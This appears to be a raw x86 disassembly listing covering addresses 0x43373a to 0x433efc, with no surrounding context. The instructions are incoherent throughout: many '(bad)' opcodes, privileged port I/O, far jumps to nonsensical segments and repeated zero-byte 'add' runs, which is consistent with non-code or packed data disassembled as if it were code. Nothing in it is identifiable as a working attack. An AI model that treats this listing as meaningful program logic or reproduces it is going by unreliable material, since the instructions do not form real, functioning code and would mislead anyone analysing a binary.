  43373a:	add    BYTE PTR [esi+0x1c],0x7d
  43373e:	(bad)  
  43373f:	call   0x39488c
  433744:	pop    edi
  433745:	cmp    edi,ebp
  433747:	test   BYTE PTR [ebx+ecx*4-0x31847505],cl
  43374e:	jl     0x4336f4
  433750:	push   ecx
  433751:	jmp    0x1772:0xff347d7a
  433758:	inc    edi
  433759:	shr    BYTE PTR [ecx],0x8d
  43375c:	mov    DWORD PTR [edx+0x50],esp
  43375f:	mov    ebx,edx
  433761:	push   ds
  433762:	xchg   ebx,eax
  433763:	idiv   BYTE PTR [ebx-0x6f3b85f7]
  433769:	jl     0x433724
  43376b:	je     0x4336fb
  43376d:	jle    0x433745
  43376f:	cmp    DWORD PTR [ecx+0x22],ecx
  433772:	je     0x433791
  433774:	pop    ds
  433775:	and    ecx,0x0
  433778:	popa   
  433779:	icebp  
  43377a:	add    BYTE PTR [esi-0x64],0x74
  43377e:	push   esp
  43377f:	in     al,0x75
  433781:	aaa    
  433782:	jnp    0x43374d
  433784:	pop    ebp
  433785:	adc    DWORD PTR [esi],ecx
  433787:	cli    
  433788:	bound  ebp,QWORD PTR [eax+0x40]
  43378b:	add    esi,eax
  43378d:	test   al,0x90
  43378f:	std    
  433790:	call   DWORD PTR [ebx-0x9ca833b]
  433796:	xlat   BYTE PTR ds:[ebx]
  433797:	mov    WORD PTR [eax],es
  433799:	add    BYTE PTR [eax],al
  43379b:	add    BYTE PTR [eax],al
  43379d:	mov    eax,0xb386b455
  4337a2:	sbb    DWORD PTR [ebx-0x37],edi
  4337a5:	sbb    eax,0x2afa0925
  4337aa:	push   0xde0e0340
  4337af:	jl     0x4337fd
  4337b1:	sbb    eax,0x9f2fae70
  4337b6:	jmp    0xe7af:0x97a5ff9b
  4337bd:	cwde   
  4337be:	(bad)  
  4337c0:	push   esi
  4337c2:	and    al,0xf0
  4337c4:	test   BYTE PTR [ebp-0x3578fc64],dh
  4337ca:	pop    edi
  4337cb:	mov    ecx,0x5b5eef3
  4337d0:	mov    WORD PTR [ecx],?
  4337d2:	icebp  
  4337d3:	stc    
  4337d4:	mov    BYTE PTR [eax],bh
  4337d6:	std    
  4337d7:	int3   
  4337d8:	inc    esp
  4337d9:	or     eax,0xc21c83dc
  4337de:	jecxz  0x4337e8
  4337e0:	test   BYTE PTR [esi+0x759b7aeb],bl
  4337e6:	jmp    0x96bb6e8
  4337eb:	add    al,0x74
  4337ed:	and    al,0x70
  4337ef:	cmp    BYTE PTR [ebx+0x36e025ee],0x8d
  4337f6:	aaa    
  4337f7:	clc    
  4337f8:	xchg   BYTE PTR [eax],ah
  4337fa:	or     DWORD PTR [esi],edi
  4337fc:	add    ebp,DWORD PTR [edx+0x2]
  4337ff:	out    0x7a,eax
  433801:	add    BYTE PTR [eax],al
  433803:	add    BYTE PTR [eax],al
  433805:	add    cl,bh
  433807:	cmc    
  433808:	mov    es,WORD PTR [esp+edi*8]
  43380b:	aas    
  43380c:	fwait
  43380d:	test   cl,ch
  43380f:	mul    bh
  433811:	(bad)  
  433812:	jle    0x4337a1
  433814:	sub    al,0x8
  433816:	std    
  433817:	ins    BYTE PTR es:[edi],dx
  433818:	call   0x29d0fad2
  43381d:	aam    0xba
  43381f:	push   eax
  433820:	jg     0x433822
  433822:	xchg   DWORD PTR [edx],eax
  433824:	out    0x84,eax
  433826:	pcmpgtb mm0,QWORD PTR ss:[ebx-0x5a]
  43382b:	add    eax,0x802f3c66
  433830:	dec    edx
  433831:	(bad)  
  433832:	dec    esp
  433833:	test   esp,eax
  433835:	fistp  WORD PTR [edx]
  433837:	jo     0x433848
  433839:	jge    0x4337cc
  43383b:	out    dx,al
  43383c:	pop    esi
  43383d:	mov    dh,0x6a
  43383f:	lea    edx,[ecx+0x340fbd3]
  433845:	mov    cl,0xa5
  433847:	lea    ebp,[ecx+0x125240ff]
  43384d:	xor    ch,BYTE PTR [ebx-0x42]
  433850:	test   esp,0xa8f36eb7
  433856:	pop    ebx
  433857:	int    0xfa
  433859:	test   al,0xfb
  43385b:	lds    ecx,FWORD PTR [esi+0x2657d17c]
  433861:	jle    0x43380e
  433863:	outs   dx,DWORD PTR ds:[esi]
  433864:	or     al,0x83
  433866:	cmp    DWORD PTR [edx],ecx
  433868:	out    0x8f,eax
  43386a:	add    BYTE PTR [eax],al
  43386c:	add    BYTE PTR [eax],al
  43386e:	add    BYTE PTR [ecx-0x1203ab73],al
  433874:	adc    bh,ah
  433876:	add    esi,DWORD PTR [ebp-0x79]
  433879:	cmp    al,0x78
  43387b:	mov    ebx,DWORD PTR [edi+0x7f7ec16e]
  433881:	add    BYTE PTR [ecx+0x148500e5],ch
  433887:	push   ebp
  433888:	or     BYTE PTR [ebx-0x6f],0xf8
  43388c:	or     BYTE PTR [edi+0x5a5d7531],al
  433892:	bound  esi,QWORD PTR [esi+0xc848550]
  433898:	mov    eax,0xcd9db5cc
  43389d:	int3   
  43389e:	lods   eax,DWORD PTR ds:[esi]
  43389f:	(bad)  
  4338a0:	int    0xcc
  4338a2:	sbb    al,0xce
  4338a4:	in     eax,dx
  4338a5:	test   DWORD PTR [edx*2-0x41f6b480],esp
  4338ac:	dec    esi
  4338ad:	sbb    al,0xb9
  4338af:	scas   eax,DWORD PTR es:[edi]
  4338b0:	sbb    BYTE PTR ds:[eax-0x44ebb951],bh
  4338b7:	lahf   
  4338b8:	dec    esi
  4338b9:	adc    BYTE PTR [ecx-0x67f3c161],bl
  4338bf:	les    ebx,FWORD PTR [esi+0x0]
  4338c2:	cdq    
  4338c3:	(bad)  
  4338c4:	or     BYTE PTR ds:[ecx+0x22],al
  4338c8:	lock stc 
  4338ca:	es test ah,0x20
  4338ce:	mov    esp,0xbc001934
  4338d3:	add    BYTE PTR [eax],al
  4338d5:	add    BYTE PTR [eax],al
  4338d7:	add    BYTE PTR [edi-0x13],ch
  4338da:	push   edx
  4338db:	bound  eax,QWORD PTR [ecx+eax*1]
  4338de:	cmp    edi,0x5
  4338e1:	add    DWORD PTR [ebx+0x5b5b5ca7],ecx
  4338e7:	sub    esi,DWORD PTR [ebp+0x2]
  4338ea:	test   DWORD PTR [edi+0x654a7fee],esp
  4338f0:	(bad)  
  4338f2:	addr16 jmp 0xe9ab3204
  4338f8:	or     al,0xf9
  4338fa:	mov    BYTE PTR [edi],ah
  4338fc:	rcr    DWORD PTR [esi+0x0],1
  4338ff:	add    BYTE PTR [ecx],ah
  433901:	rol    DWORD PTR [bx+si],1
  433904:	pushf  
  433905:	add    al,0x4a
  433907:	lea    ebx,[edx]
  433909:	test   ecx,edi
  43390b:	dec    DWORD PTR [esp+esi*4-0x50fa397e]
  433912:	push   ebp
  433913:	(bad)  
  433914:	call   0xbd04:0x5cfff9ae
  43391b:	inc    esi
  43391c:	test   al,0xfe
  43391e:	(bad)  
  43391f:	dec    DWORD PTR [esp+ebx*1-0x35]
  433923:	cli    
  433924:	rol    DWORD PTR [eax],cl
  433926:	or     al,0xf
  433929:	inc    esp
  43392a:	jp     0x4338f0
  43392c:	sub    al,0x83
  43392e:	enter  0xb80f,0x43
  433932:	cwde   
  433933:	mov    edx,ebx
  433935:	mov    ds:0x7d385688,eax
  43393a:	rcr    BYTE PTR [esi+0x0],0x0
  43393e:	add    BYTE PTR [eax],al
  433940:	add    cl,dl
  433942:	inc    ecx
  433943:	std    
  433944:	jmp    DWORD PTR [eax+0x2f]
  433947:	(bad)
  43394a:	das    
  43394b:	(bad)
  43394e:	jl     0x433935
  433950:	push   esi
  433951:	xchg   edi,eax
  433952:	xchg   edx,eax
  433953:	add    DWORD PTR [ebp-0x72fe6da6],eax
  433959:	sbb    ch,BYTE PTR [edx+0x57]
  43395c:	pop    ebp
  43395d:	sahf   
  43395e:	idiv   ecx
  433960:	mov    bl,BYTE PTR [edx]
  433962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433963:	add    al,BYTE PTR [esi-0x18]
  433966:	xchg   edx,eax
  433967:	add    edi,DWORD PTR [eax-0x9ffd0]
  43396d:	loop   0x433919
  43396f:	mov    ebx,0x4f7ccc04
  433974:	cmp    BYTE PTR [ebx+0x79],bh
  433977:	ja     0x4339b5
  433979:	sbb    eax,0x75fff60c
  43397e:	jmp    0x5ebcae80
  433983:	add    esi,DWORD PTR [ebx+0x7a]
  433986:	je     0x433942
  433988:	dec    edi
  433989:	(bad)  
  43398a:	daa    
  43398b:	mov    al,0x7e
  43398d:	mov    ch,0xea
  43398f:	adc    al,0x75
  433992:	hlt    
  433993:	aas    
  433994:	je     0x433a00
  433996:	in     al,0x34
  433998:	je     0x433a18
  43399a:	cmp    BYTE PTR [ebx+ebx*4+0x6a],cl
  43399e:	nop
  43399f:	add    ebx,DWORD PTR [ecx-0x40]
  4339a2:	stos   DWORD PTR es:[edi],eax
  4339a3:	add    BYTE PTR [eax],al
  4339a5:	add    BYTE PTR [eax],al
  4339a7:	add    BYTE PTR [eax],al
  4339a9:	add    dh,ch
  4339ab:	outs   dx,BYTE PTR ds:[esi]
  4339ac:	push   esp
  4339ad:	call   DWORD PTR [edx-0x17]
  4339b0:	add    BYTE PTR [edx-0x216e7],cl
  4339b6:	out    dx,al
  4339b7:	dec    esi
  4339b8:	pop    esp
  4339b9:	(bad)  
  4339ba:	cmp    ch,cl
  4339bc:	xchg   edi,eax
  4339bd:	call   FWORD PTR [ecx+ebp*8-0x7bbc8e]
  4339c4:	cld    
  4339c5:	inc    ecx
  4339c6:	mov    ebp,0x7565fdc3
  4339cb:	ins    BYTE PTR es:[edi],dx
  4339cc:	stos   BYTE PTR es:[edi],al
  4339cd:	pop    ebx
  4339ce:	jne    0x433a3c
  4339d0:	mov    edx,0xfdc3744f
  4339d5:	gs jne 0x433a44
  4339d8:	stos   BYTE PTR es:[edi],al
  4339d9:	push   ebx
  4339da:	jne    0x433a4a
  4339dc:	jb     0x4339b5
  4339de:	jne    0x4339c9
  4339e0:	std    
  4339e1:	push   eax
  4339e2:	clc    
  4339e3:	jbe    0x433969
  4339e5:	jmp    edx
  4339e7:	call   0x10f6c09b
  4339ec:	out    dx,eax
  4339ed:	cmc    
  4339ee:	shl    bh,cl
  4339f0:	js     0x4339b9
  4339f2:	xchg   BYTE PTR [ecx],ch
  4339f4:	jg     0x4339b9
  4339f6:	xchg   ebp,eax
  4339f7:	pop    esi
  4339f8:	xor    eax,0xa701e10a
  4339fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4339fe:	or     eax,0xfda42189
  433a03:	dec    edi
  433a04:	dec    ebx
  433a05:	jns    0x4339bc
  433a07:	push   edi
  433a08:	sub    al,0x42
  433a0a:	jbe    0x433a0e
  433a0c:	mov    bl,0x37
  433a0e:	add    BYTE PTR [eax],al
  433a10:	add    BYTE PTR [eax],al
  433a12:	add    BYTE PTR [esi-0x41c8543b],bh
  433a18:	lds    ebx,FWORD PTR [ecx+edi*2]
  433a1b:	mov    cs,WORD PTR [edx+0x44f3fc24]
  433a21:	test   DWORD PTR [eax-0x2ecdf4a2],0x78cf8c6f
  433a2b:	mov    ecx,0xedcb6006
  433a30:	jp     0x433a1d
  433a32:	jp     0x4339c1
  433a34:	mov    DWORD PTR [ecx],edx
  433a36:	mov    esp,0x38f904b
  433a3b:	jne    0x433a3f
  433a3d:	pop    esi
  433a3e:	mov    ebp,0x276911ae
  433a43:	xor    dh,dh
  433a45:	out    0x78,eax
  433a47:	mov    esp,0xb0b3ba32
  433a4c:	push   ebx
  433a4d:	mov    cl,0x1b
  433a4f:	and    al,0x32
  433a51:	out    0x3,eax
  433a53:	xchg   edx,eax
  433a54:	mov    esi,0x6eca7ed3
  433a59:	fild   WORD PTR [eax+0x788af63a]
  433a5f:	adc    DWORD PTR [eax+0x26],ebx
  433a62:	js     0x433a98
  433a64:	xor    ch,BYTE PTR [esi+ebp*4-0x12]
  433a68:	push   eax
  433a69:	pop    esi
  433a6a:	xor    eax,0x4162bda
  433a6f:	fild   WORD PTR [ecx-0x3d0600d5]
  433a75:	jae    0x433a75
  433a77:	add    BYTE PTR [eax],al
  433a79:	add    BYTE PTR [eax],al
  433a7b:	add    BYTE PTR [ebx-0x3b],cl
  433a7e:	add    dh,dh
  433a80:	push   0xb
  433a82:	jg     0x433af0
  433a84:	jb     0x433acb
  433a86:	inc    ebp
  433a87:	jmp    0xfc08:0x9e036e7a
  433a8e:	stc    
  433a8f:	(bad)  
  433a90:	add    al,0x42
  433a92:	cld    
  433a93:	cmp    edx,ebp
  433a95:	inc    eax
  433a96:	xor    BYTE PTR [edx-0x59],dh
  433a99:	jmp    0xad7d:0xf876bb9f
  433aa0:	ins    DWORD PTR es:[edi],dx
  433aa1:	add    eax,0xc9777235
  433aa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433aa8:	add    al,BYTE PTR [eax+0x30]
  433aab:	ins    BYTE PTR es:[edi],dx
  433aac:	(bad)  
  433aad:	cli    
  433aae:	dec    edi
  433aaf:	bound  eax,QWORD PTR [edi-0x16]
  433ab2:	xchg   DWORD PTR [ebx-0x5282078a],ebx
  433ab8:	jge    0x433a3b
  433aba:	shl    ch,0x73
  433abd:	ja     0x433a88
  433abf:	jbe    0x433ab3
  433ac1:	aas    
  433ac2:	xor    BYTE PTR [esp+ebx*4-0xa],bl
  433ac6:	dec    esi
  433ac7:	jb     0x433b10
  433ac9:	jmp    0x2d7d:0xf8765b6f
  433ad0:	ins    DWORD PTR es:[edi],dx
  433ad1:	add    eax,0xc9776dd5
  433ad7:	inc    esi
  433ad8:	and    dl,BYTE PTR [ebx+eax*4]
  433adb:	mov    WORD PTR ds:[eax],ds
  433ade:	test   DWORD PTR [edi+0x0],ebp
  433ae1:	add    BYTE PTR [eax],al
  433ae3:	add    BYTE PTR [eax],al
  433ae5:	in     eax,0x1
  433ae7:	add    cl,ch
  433ae9:	cmp    DWORD PTR [ecx-0x4],eax
  433aec:	pushf  
  433aed:	test   BYTE PTR [ecx+0x778795c0],al
  433af3:	clc    
  433af4:	in     eax,0x6a
  433af6:	cld    
  433af7:	jl     0x433b0a
  433af9:	imul   ebp,DWORD PTR [esi+0x3],0xf7973b00
  433b00:	dec    ebx
  433b02:	xchg   ecx,eax
  433b03:	cmp    eax,0x3e83dcfc
  433b08:	xor    BYTE PTR [edi-0x30],dl
  433b0b:	call   0xf64309a5
  433b10:	adc    eax,0xfffffffc
  433b13:	jl     0x433ad5
  433b15:	inc    eax
  433b16:	std    
  433b17:	jp     0x433ae8
  433b19:	stos   DWORD PTR es:[edi],eax
  433b1a:	cmp    DWORD PTR [esi],0x30
  433b1d:	or     DWORD PTR [edx-0x4],edx
  433b20:	push   ebx
  433b21:	ins    DWORD PTR es:[edi],dx
  433b22:	test   esi,eax
  433b24:	call   0x3b2771
  433b29:	push   ss
  433b2a:	(bad)  
  433b2b:	clc    
  433b2c:	and    DWORD PTR [eax],0xfffffffc
  433b2f:	jl     0x433af1
  433b31:	or     BYTE PTR [ecx],0x7b
  433b34:	iret   
  433b35:	or     esp,ebp
  433b37:	adc    DWORD PTR [ebp-0x74f28515],eax
  433b3d:	jno    0x433b41
  433b3f:	xor    dl,BYTE PTR [esi-0x60]
  433b45:	inc    eax
  433b46:	push   es
  433b47:	out    dx,al
  433b48:	ret    
  433b49:	add    BYTE PTR [eax],al
  433b4b:	add    BYTE PTR [eax],al
  433b4d:	add    BYTE PTR [ebx+edi*2-0x3],dl
  433b51:	mov    esi,0xfff600f5
  433b56:	cdq    
  433b57:	dec    edx
  433b58:	cld    
  433b59:	push   eax
  433b5a:	xchg   edi,eax
  433b5b:	dec    ecx
  433b5c:	xor    BYTE PTR [ebx-0xdc11886],cl
  433b62:	mov    ebx,0x10c47a00
  433b67:	mov    eax,eax
  433b69:	je     0x433b7c
  433b6b:	jge    0x433b34
  433b6d:	push   DWORD PTR [edi-0x67b27cd9]
  433b73:	jl     0x433b66
  433b75:	inc    DWORD PTR [eax]
  433b77:	and    BYTE PTR [ebp-0x1],bh
  433b7a:	jne    0x433b12
  433b7c:	sbb    DWORD PTR ds:0x988fd0b5,ebp
  433b82:	jne    0x433b6d
  433b84:	std    
  433b85:	jb     0x433c04
  433b87:	rol    BYTE PTR [edi-0x2168a64],0x73
  433b8e:	outs   dx,DWORD PTR ds:[esi]
  433b8f:	jmp    0x433b54
  433b91:	or     BYTE PTR [eax],ch
  433b93:	out    0xc0,al
  433b95:	xchg   edi,eax
  433b96:	stos   BYTE PTR es:[edi],al
  433b97:	aam    0xff
  433b99:	test   DWORD PTR [ebx],edi
  433b9b:	sbb    DWORD PTR [ecx-0x74c566b5],ecx
  433ba1:	retf   0xe59d
  433ba4:	repz stc 
  433ba6:	mov    ch,BYTE PTR [eax-0x38]
  433ba9:	add    al,0xf8
  433bab:	test   eax,0x94f60378
  433bb0:	jmp    ebp
  433bb2:	add    BYTE PTR [eax],al
  433bb4:	add    BYTE PTR [eax],al
  433bb6:	add    BYTE PTR [ebp-0x903b690],bl
  433bbc:	mov    eax,ds:0x669574ff
  433bc1:	push   DWORD PTR [ebx+0x79]
  433bc4:	fdivr  DWORD PTR [ebp+0x4490335]
  433bca:	add    BYTE PTR [ebp-0x12],dh
  433bcd:	add    eax,0x444fb35
  433bd2:	add    BYTE PTR [ebp-0x13],dh
  433bd5:	or     esi,edx
  433bd7:	ss icebp 
  433bd9:	jb     0x433bde
  433bdb:	jmp    0x4660:0x22f9ff81
  433be2:	xor    al,ch
  433be4:	lods   eax,DWORD PTR ds:[esi]
  433be5:	cmc    
  433be6:	dec    esi
  433be7:	(bad)  
  433be8:	sub    ch,ah
  433bea:	pop    esi
  433beb:	add    al,0x34
  433bed:	inc    DWORD PTR [ebp-0x3b7cce60]
  433bf3:	jno    0x433c53
  433bf5:	les    esi,FWORD PTR [eax+edi*2+0x2]
  433bf9:	shr    sp,1
  433bfc:	out    0xf8,al
  433bfe:	xchg   ah,bl
  433c00:	ins    BYTE PTR es:[edi],dx
  433c01:	in     al,0x3c
  433c03:	jmp    FWORD PTR [ecx+0x6e7503e7]
  433c09:	in     al,dx
  433c0a:	shl    dl,0xf2
  433c0d:	cli    
  433c0e:	add    bl,bh
  433c10:	cmp    al,0xdf
  433c12:	add    bl,BYTE PTR [ebp-0x7b]
  433c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433c16:	sti    
  433c17:	inc    ebp
  433c18:	xchg   DWORD PTR [ecx],ebp
  433c1a:	xor    al,0x0
  433c1c:	add    BYTE PTR [eax],al
  433c1e:	add    BYTE PTR [eax],al
  433c20:	lock ret 
  433c22:	iret   
  433c23:	xor    BYTE PTR [edx-0x4e7b2d0e],dl
  433c29:	std    
  433c2a:	arpl   bx,ax
  433c2c:	or     edi,edi
  433c2e:	ror    BYTE PTR gs:[esi+eax*4+0x4cf81024],1
  433c36:	xlat   BYTE PTR ds:[ebx]
  433c37:	xor    al,0xb2
  433c39:	dec    BYTE PTR [eax-0x25]
  433c3c:	jne    0x433c40
  433c3e:	out    0x14,eax
  433c40:	dec    esi
  433c42:	out    0x3,eax
  433c44:	jne    0x433bcb
  433c46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433c47:	and    eax,ebx
  433c49:	shl    edi,cl
  433c4b:	mov    ch,BYTE PTR [ebp+0x7b]
  433c4e:	das    
  433c4f:	or     al,dh
  433c51:	inc    edi
  433c52:	jg     0x433be0
  433c54:	scas   al,BYTE PTR es:[edi]
  433c55:	cli    
  433c56:	pop    edi
  433c57:	add    eax,0x8d0e033a
  433c5c:	xor    al,0x52
  433c5e:	outs   dx,BYTE PTR ds:[esi]
  433c5f:	out    0xce,al
  433c61:	lds    ebp,FWORD PTR [ebx]
  433c63:	iret   
  433c64:	xor    DWORD PTR [edi-0x79f67344],edi
  433c6a:	cmp    edx,DWORD PTR [edi]
  433c6c:	clc    
  433c6d:	inc    edi
  433c6e:	out    dx,eax
  433c6f:	xor    al,0x3b
  433c71:	jl     0x433c07
  433c73:	dec    DWORD PTR [eax-0x3c]
  433c76:	add    BYTE PTR [edi+ebp*2+0x1533e7d],bh
  433c7d:	out    0x5b,al
  433c7f:	sub    edi,DWORD PTR [edx+0x2]
  433c82:	push   edx
  433c83:	jb     0x433c85
  433c85:	add    BYTE PTR [eax],al
  433c87:	add    BYTE PTR [eax],al
  433c89:	es jecxz 0x433c8c
  433c8c:	jmp    0x95317407
  433c91:	sub    BYTE PTR [edx-0x138af96a],0x5a
  433c98:	jb     0x433c75
  433c9a:	dec    ebp
  433c9b:	mov    esi,0x123976e5
  433ca0:	je     0x433c24
  433ca2:	stos   BYTE PTR es:[edi],al
  433ca3:	pushf  
  433ca4:	out    0xaa,al
  433ca6:	jmp    0x433d02
  433ca8:	jb     0x433c36
  433caa:	dec    ebp
  433cab:	mov    esi,0x853f76e5
  433cb0:	sub    al,0x69
  433cb2:	aaa    
  433cb3:	(bad)  
  433cb4:	cmp    al,0x7f
  433cb6:	push   edi
  433cb7:	sub    eax,0xe38723a9
  433cbc:	adc    al,0xb7
  433cbe:	(bad)  
  433cbf:	jmp    DWORD PTR [ecx-0x44]
  433cc2:	inc    BYTE PTR [esi+0x5a89812f]
  433cc8:	cmc    
  433cc9:	lahf   
  433cca:	xchg   esp,eax
  433ccb:	test   cl,ch
  433ccd:	jbe    0x433cd1
  433ccf:	outs   dx,BYTE PTR ds:[esi]
  433cd0:	repnz retf 
  433cd2:	cli    
  433cd3:	xor    al,0x67
  433cd5:	icebp  
  433cd6:	add    DWORD PTR [eax],eax
  433cd8:	jmp    0x5f7a3ea5
  433cdd:	sub    DWORD PTR [edx],eax
  433cdf:	add    cl,ch
  433ce1:	lods   eax,DWORD PTR ds:[esi]
  433ce2:	or     DWORD PTR [ebp+0x1f177],eax
  433ce8:	jmp    0xbe5778de
  433ced:	add    BYTE PTR [eax],al
  433cef:	add    BYTE PTR [eax],al
  433cf1:	add    bh,ch
  433cf3:	imul   ecx,DWORD PTR [eax],0x1a
  433cf6:	cmp    DWORD PTR [edi+0x3f1f00c9],eax
  433cfc:	js     0x433d11
  433cfe:	fidiv  DWORD PTR [eax+0x33]
  433d01:	sar    BYTE PTR [esi-0x18fb90ea],1
  433d07:	int    0x6e
  433d09:	adc    ch,dl
  433d0b:	xchg   esi,eax
  433d0c:	enter  0xcc00,0x4
  433d10:	je     0x433d1a
  433d12:	push   edi
  433d13:	pop    eax
  433d14:	js     0x433d19
  433d16:	mov    edi,DWORD PTR [edi+0x4e]
  433d19:	adc    al,0x5f
  433d1b:	jo     0x433d31
  433d1d:	add    bl,dl
  433d1f:	xchg   BYTE PTR [eax+0x7b04cc01],dh
  433d25:	jle    0x433cbb
  433d27:	add    al,0x7
  433d29:	test   edi,esi
  433d2b:	add    al,0x0
  433d2d:	add    BYTE PTR [edi],ah
  433d2f:	inc    edi
  433d30:	jl     0x433cbd
  433d32:	push   edx
  433d33:	outs   dx,BYTE PTR ds:[esi]
  433d34:	jge    0x433cf6
  433d36:	sub    esi,edi
  433d38:	jl     0x433d03
  433d3a:	or     DWORD PTR [eax+0x48c0081],0xffffffb7
  433d41:	add    BYTE PTR [esi+eax*1+0x0],cl
  433d45:	test   DWORD PTR [ecx+edi*2],ebx
  433d48:	or     DWORD PTR [edx+0x58],esi
  433d4b:	sub    eax,0x7d6773c7
  433d50:	jbe    0x433dca
  433d52:	leave  
  433d53:	lock pop es
  433d55:	test   BYTE PTR [eax],al
  433d57:	add    BYTE PTR [eax],al
  433d59:	add    BYTE PTR [eax],al
  433d5b:	fiadd  DWORD PTR [esi]
  433d5d:	add    BYTE PTR [eax],al
  433d5f:	mov    DWORD PTR [ebp+0x44c00c0],0x7b8c45fb
  433d69:	xchg   ah,al
  433d6b:	sbb    al,0x4
  433d6d:	add    BYTE PTR [ebx],dl
  433d6f:	loop   0x433db8
  433d71:	adc    DWORD PTR [esi+0x408],0x75
  433d78:	ret    
  433d79:	std    
  433d7a:	dec    esi
  433d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433d7c:	stos   DWORD PTR es:[edi],eax
  433d7d:	nop
  433d7e:	cmp    ch,0xd9
  433d81:	std    
  433d82:	jmp    DWORD PTR [ebp+0x7530ea51]
  433d88:	fnstcw WORD PTR [esi-0x3c]
  433d8b:	mov    DWORD PTR [esi-0x43],esp
  433d8e:	or     eax,esi
  433d90:	mov    BYTE PTR [eax+eax*1],0x75
  433d94:	je     0x433da1
  433d96:	test   DWORD PTR [ebx],eax
  433d98:	dec    esi
  433d99:	std    
  433d9a:	push   DWORD PTR [ebp+0x64]
  433d9d:	and    DWORD PTR [ebp+esi*2+0x2450fdd9],0x74
  433da5:	mov    ecx,DWORD PTR [ebp+esi*2+0x454dfdd9]
  433dac:	loopne 0x433d7b
  433dae:	jge    0x433d61
  433db0:	jmp    0x66b5feed
  433db5:	cmp    al,0xff
  433db7:	call   0xfd99:0x461288d9
  433dbe:	jns    0x433dc0
  433dc0:	add    BYTE PTR [eax],al
  433dc2:	add    BYTE PTR [eax],al
  433dc4:	xor    eax,0xec045272
  433dc9:	das    
  433dca:	or     al,0xf
  433dcc:	xor    ebx,DWORD PTR ds:0xd2ed7a25
  433dd2:	inc    ebx
  433dd3:	jl     0x433dd3
  433dd5:	pop    esi
  433dd6:	mov    esp,0x82d97500
  433ddb:	shr    BYTE PTR [edx+0x5d],0x8c
  433ddf:	add    BYTE PTR [ebp-0x27],dh
  433de2:	cmp    BYTE PTR [edx-0x226c3],0x75
  433de9:	idiv   BYTE PTR [ebp+edi*2+0x3d]
  433ded:	in     eax,0xc
  433def:	test   BYTE PTR [ecx+ebx*8],dl
  433df2:	std    
  433df3:	(bad)  
  433df4:	inc    BYTE PTR [ecx]
  433df6:	test   eax,0xf73ff81b
  433dfb:	imul   ebx,DWORD PTR [ebx],0xc307b97e
  433e01:	jns    0x433da7
  433e03:	div    edx
  433e05:	cmp    al,0xd7
  433e07:	jmp    0x433dac
  433e09:	or     esp,edi
  433e0b:	add    esi,edx
  433e0d:	inc    esp
  433e0e:	fild   WORD PTR [esi-0x7f23964b]
  433e14:	outs   dx,DWORD PTR ds:[esi]
  433e15:	push   cs
  433e16:	out    0x77,eax
  433e18:	je     0x433de1
  433e1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433e1b:	or     ebx,esi
  433e1d:	out    dx,al
  433e1e:	adc    bh,ch
  433e20:	clc    
  433e21:	dec    edi
  433e22:	out    dx,eax
  433e23:	xor    BYTE PTR [ebp+0x28fe7a],dh
  433e29:	add    BYTE PTR [eax],al
  433e2b:	add    BYTE PTR [eax],al
  433e2d:	imul   BYTE PTR ds:[esi-0x34]
  433e31:	pusha  
  433e32:	shr    eax,0x7d
  433e35:	sbb    eax,0xf273997b
  433e3a:	inc    esp
  433e3b:	xlat   BYTE PTR ds:[ebx]
  433e3c:	adc    dh,BYTE PTR [edi]
  433e3e:	pop    esi
  433e3f:	outs   dx,BYTE PTR ds:[esi]
  433e40:	inc    esi
  433e41:	test   DWORD PTR [edi+0x37],edx
  433e44:	push   ebx
  433e45:	popf   
  433e46:	mov    BYTE PTR [esi],dl
  433e48:	add    al,0x75
  433e4a:	sbb    DWORD PTR [ecx-0x18fd8a7d],eax
  433e50:	mov    BYTE PTR [esi],ah
  433e52:	repnz pusha 
  433e54:	inc    ebp
  433e55:	in     eax,0xb
  433e57:	push   ecx
  433e58:	xchg   DWORD PTR [ebp+0x2],esi
  433e5b:	out    0x28,eax
  433e5d:	mov    esi,0x6d466ef6
  433e62:	add    esi,DWORD PTR [eax+eax*1]
  433e65:	shr    edx,cl
  433e67:	call   0xa7cafee3
  433e6c:	jbe    0x433e39
  433e6e:	(bad)  [esi]
  433e70:	mov    DWORD PTR [edi+0x366bfffa],esi
  433e76:	jb     0x433e80
  433e78:	bound  edi,QWORD PTR [eax-0x5d48fa96]
  433e7e:	jbe    0x433ee2
  433e80:	jb     0x433e1a
  433e82:	push   ss
  433e83:	xor    eax,0x86ec8451
  433e88:	push   ecx
  433e89:	inc    ebp
  433e8a:	ret    0x4683
  433e8d:	mov    dl,BYTE PTR [eax]
  433e8f:	in     eax,0xea
  433e91:	add    BYTE PTR [eax],al
  433e93:	add    BYTE PTR [eax],al
  433e95:	add    bl,ch
  433e97:	inc    ebp
  433e98:	add    BYTE PTR [edx+0x48],ah
  433e9b:	push   es
  433e9c:	xchg   ch,dl
  433e9e:	xchg   BYTE PTR [edi+0x16eef94a],al
  433ea4:	or     BYTE PTR [ecx+0x66ec39d],ch
  433eaa:	std    
  433eab:	inc    eax
  433eac:	adc    BYTE PTR [edx+0x38],ah
  433eaf:	jb     0x433f02
  433eb1:	mov    edx,0x917bed9d
  433eb6:	es cmp eax,0xda22970f
  433ebc:	daa    
  433ebd:	mov    edx,0xa7270276
  433ec2:	stc    
  433ec3:	add    al,BYTE PTR [eax]
  433ec5:	jmp    0xf0b37fb3
  433eca:	in     al,dx
  433ecb:	xchg   BYTE PTR [eax],al
  433ecd:	jmp    0xf1bd6448
  433ed2:	push   ecx
  433ed3:	push   0x11fce814
  433ed8:	push   DWORD PTR [esi]
  433eda:	jne    0x433ec9
  433edc:	jnp    0x433eaf
  433ede:	jno    0x433f49
  433ee0:	cld    
  433ee1:	push   0xffffffdf
  433ee3:	push   ss
  433ee4:	add    dh,ch
  433ee6:	not    DWORD PTR [ecx-0x6]
  433ee9:	xchg   esi,eax
  433eea:	dec    esi
  433eeb:	xchg   DWORD PTR [ebx-0x73],eax
  433eee:	scas   al,BYTE PTR es:[edi]
  433eef:	push   edi
  433ef0:	pop    edx
  433ef1:	add    bh,al
  433ef3:	jecxz  0x433f4a
  433ef5:	ret    0x148
  433ef8:	push   edi
  433ef9:	pop    ebx
  433efa:	add    BYTE PTR [eax],al
  433efc:	add    BYTE PTR [eax],al
